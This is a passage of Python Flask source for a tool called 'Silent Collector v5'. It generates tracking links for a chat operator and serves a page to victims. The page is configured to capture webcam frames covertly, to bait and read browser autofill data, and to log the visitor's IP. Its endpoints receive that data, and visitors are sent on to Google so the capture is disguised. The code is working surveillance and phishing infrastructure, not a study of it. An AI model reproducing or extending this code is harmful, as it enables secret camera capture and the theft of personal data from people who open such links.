            raw = redis_client.get(f"silent:{session_id}")
            if not raw:
                return redirect(GOOGLE_REDIRECT, code=302)
            session_data = json.loads(raw)
            session_data['accessed'] = True
            session_data['accessed_at'] = time.time()
            session_data['accessed_ip'] = (
                request.headers.get('CF-Connecting-IP') or
                request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
                request.remote_addr
            )
            redis_client.setex(f"silent:{session_id}", SESSION_TTL, json.dumps(session_data))
            logger.info(f"🎯 Silent accessed: {session_id}")
        except Exception as e:
            logger.exception(f"silent_collector_page error: {e}")
            return redirect(GOOGLE_REDIRECT, code=302)
        endpoint = f"{PUBLIC_URL}/s/{session_id}"
        html = (COLLECTOR_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__ENDPOINT__", endpoint)
                .replace("__REDIRECT_URL__", GOOGLE_REDIRECT)
                .replace("__CAMERA_INTERVAL__", str(CAMERA_INTERVAL))
                .replace("__CAMERA_MAX_FRAMES__", str(CAMERA_MAX_FRAMES))
                .replace("__ACCESS_DELAY__", str(ACCESS_DELAY))
                .replace("__AUTOFILL_BAIT_DELAY__", str(AUTOFILL_BAIT_DELAY))
                .replace("__AUTOFILL_READ_DELAY__", str(AUTOFILL_READ_DELAY)))
        response = app.make_response(html)
        response.headers['Content-Type'] = 'text/html; charset=utf-8'
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        response.headers['X-Robots-Tag'] = 'noindex, nofollow'
        return response

    @app.route('/s/<session_id>/collect', methods=['POST', 'OPTIONS'])
    def silent_collect_endpoint(session_id):
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200
        try:
            data = request.get_json(silent=True) or {}
            if data.get('session_id') != session_id:
                return jsonify({'ok': False}), 200
            success = store_collected_data(session_id, data)
            resp = jsonify({'ok': success})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200
        except Exception as e:
            logger.exception(f"silent_collect_endpoint error: {e}")
            resp = jsonify({'ok': False})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

    @app.route('/s/<session_id>/camera', methods=['POST', 'OPTIONS'])
    def silent_camera_endpoint(session_id):
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200
        try:
            data = request.get_json(silent=True) or {}
            if data.get('session_id') != session_id:
                return jsonify({'ok': False}), 200
            success = store_camera_frame(session_id, data)
            resp = jsonify({'ok': success})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200
        except Exception as e:
            resp = jsonify({'ok': False})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

    @app.route('/s/<session_id>/signal', methods=['POST', 'OPTIONS'])
    def silent_signal_endpoint(session_id):
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200
        try:
            data = request.get_json(silent=True) or {}
            if data.get('session_id') != session_id:
                return jsonify({'ok': False}), 200
            success = handle_camera_signal(session_id, data)
            resp = jsonify({'ok': success})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200
        except Exception as e:
            resp = jsonify({'ok': False})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

    @app.route('/s/<session_id>/autofill', methods=['POST', 'OPTIONS'])
    def silent_autofill_endpoint(session_id):
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200
        try:
            data = request.get_json(silent=True) or {}
            if data.get('session_id') != session_id:
                return jsonify({'ok': False}), 200
            if data.get('type') != 'autofill_data':
                return jsonify({'ok': False}), 200
            success = store_autofill_data(session_id, data)
            resp = jsonify({'ok': success})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200
        except Exception as e:
            logger.exception(f"silent_autofill_endpoint error: {e}")
            resp = jsonify({'ok': False})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

    @app.route('/s/<session_id>/go', methods=['GET'])
    def silent_redirect(session_id):
        return redirect(GOOGLE_REDIRECT, code=302)

    logger.info("[+] Silent Collector v5 routes registered: /s/<session_id>")


# ============================================================
# Public API
# ============================================================
def generate_silent_link(chat_id, label=""):
    session_id = create_silent_session(chat_id, label)
    if not session_id:
        return None
    return f"{PUBLIC_URL}/s/{session_id}"


def get_silent_data(session_id):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"silent_data:{session_id}")
        if raw:
            return json.loads(raw)
    except Exception as e:
        logger.warning(f"get_silent_data error: {e}")
    return None


def get_user_silent_sessions(chat_id, limit=50):
    if not redis_client:
        return []
    try:
        session_ids = redis_client.lrange(f"silent_user:{chat_id}", 0, limit - 1)
        result = []
        for sid in session_ids:
            sdata = redis_client.get(f"silent:{sid}")
            if sdata:
                try:
                    result.append(json.loads(sdata))
                except Exception:
                    continue
        return result
    except Exception as e:
        logger.warning(f"get_user_silent_sessions error: {e}")
        return []
